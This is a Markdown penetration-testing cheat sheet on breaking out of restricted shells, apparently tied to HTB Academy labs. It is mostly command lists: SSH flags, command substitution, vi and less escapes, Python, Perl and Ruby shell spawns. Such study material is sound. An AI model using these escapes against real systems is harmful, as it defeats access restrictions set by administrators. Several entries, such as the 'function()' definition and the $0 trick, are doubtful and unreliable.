# 🚪 Escaping Restricted Shells

## 🎯 Overview

Techniques to break out of restricted shells (rbash, rksh, rzsh) that limit command execution, directory changes, and environment modification.

## 🔒 Restricted Shell Types

| Shell | Description |
|-------|-------------|
| **rbash** | Restricted Bourne shell - limits cd, PATH modification |
| **rksh** | Restricted Korn shell - blocks shell functions, command execution |
| **rzsh** | Restricted Z shell - prevents aliases, script execution |

## 🚪 Escape Techniques

### SSH Bypass Methods
```bash
# Method 1: SSH with bash noprofile
ssh user@target -t "bash --noprofile"

# Method 2: SSH with different shell
ssh user@target -t "/bin/bash"
ssh user@target -t "/bin/sh"

# Method 3: SSH command execution
ssh user@target "bash -i"

# Method 4: SSH with environment bypass
ssh user@target -t "env -i bash --norc --noprofile"
```

### Command Injection
```bash
# Via backticks (command substitution)
ls -l `pwd`
ls -l `bash`

# Via $() substitution
ls -l $(bash)
ls -l $(sh)

# Via environment variables
echo $0
$0  # Often launches unrestricted shell
```

### Environment Variable Manipulation
```bash
# Check available variables
env

# Exploit SHELL variable
SHELL=/bin/bash
$SHELL

# PATH manipulation (if allowed)
PATH=/bin:/usr/bin
export PATH
bash
```

### Built-in Command Abuse
```bash
# Vi/Vim escape
vi
:!/bin/bash

# Less/More pager escape
less /etc/passwd
!/bin/bash

# Man page escape
man ls
!/bin/bash

# Python escape (if available)
python -c "import os; os.system('/bin/bash')"
python3 -c "import os; os.system('/bin/bash')"
```

### Shell Function Exploitation
```bash
# Define function to execute bash
function() { /bin/bash; }
function

# Or use eval
eval "bash"
```

## 🔧 Advanced Bypass Techniques

### Character Escaping
```bash
# Use backslashes
\b\a\s\h

# Use quotes
"bash"
'bash'

# Use variable expansion
b=bash
$b
```

### Alternative Interpreters
```bash
# Try different shells
sh
dash
zsh
csh
tcsh

# Scripting languages
python -c "import pty; pty.spawn('/bin/bash')"
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
```

### File-based Escapes
```bash
# Create script file
echo "/bin/bash" > escape.sh
chmod +x escape.sh
./escape.sh

# Use existing binaries
cp /bin/bash /tmp/mybash
/tmp/mybash
```

## 🔍 Enumeration & Detection

### Identify Restricted Shell
```bash
# Check current shell
echo $SHELL
echo $0

# Test restrictions
cd /tmp    # Will fail in rbash
export TEST=value  # Will fail if export restricted
bash       # Will fail if command execution blocked
```

### Quick Escape Test Script
```bash
#!/bin/bash
echo "=== RESTRICTED SHELL ESCAPE TEST ==="

echo "[+] Current shell: $SHELL"
echo "[+] Shell type: $0"

echo "[+] Testing SSH bypass methods:"
echo "ssh user@host -t 'bash --noprofile'"
echo "ssh user@host -t '/bin/bash'"

echo "[+] Testing command substitution:"
echo 'ls -l `pwd`'
echo 'ls -l $(bash)'

echo "[+] Testing environment variables:"
echo '$SHELL'
echo '$0'

echo "[+] Testing alternative interpreters:"
which python python3 perl ruby 2>/dev/null
```

## 🚀 Practical Examples

### HTB Academy Example
```bash
# Connect with SSH bypass
ssh htb-user@target -t "bash --noprofile"

# Break out with Ctrl+C if needed
# Ctrl+C

# Verify escape
ls
cat flag.txt
# Result: HTB{...
```

### Common Escape Sequence
```bash
# 1. Try SSH bypass first
ssh user@host -t "bash --noprofile"

# 2. If in restricted shell, try command substitution
ls -l `bash`

# 3. Try environment variable
$SHELL

# 4. Try scripting language
python -c "import os; os.system('/bin/bash')"

# 5. Try vi escape
vi
:!/bin/bash
```

## 🔑 Quick Reference

### Most Effective Methods
1. **SSH bypass**: `ssh user@host -t "bash --noprofile"`
2. **Command substitution**: `ls $(bash)`
3. **Environment escape**: `$0` or `$SHELL`
4. **Vi/editor escape**: `:!/bin/bash`
5. **Python spawn**: `python -c "import pty; pty.spawn('/bin/bash')"`

### Emergency Escapes
```bash
# If nothing else works
echo $0        # Check shell type
env            # List environment variables  
compgen -c     # List available commands
help           # Built-in help
```

---

*Restricted shell escapes exploit the fundamental tension between security restrictions and functional requirements - finding gaps in command limitations to restore full shell capabilities.* 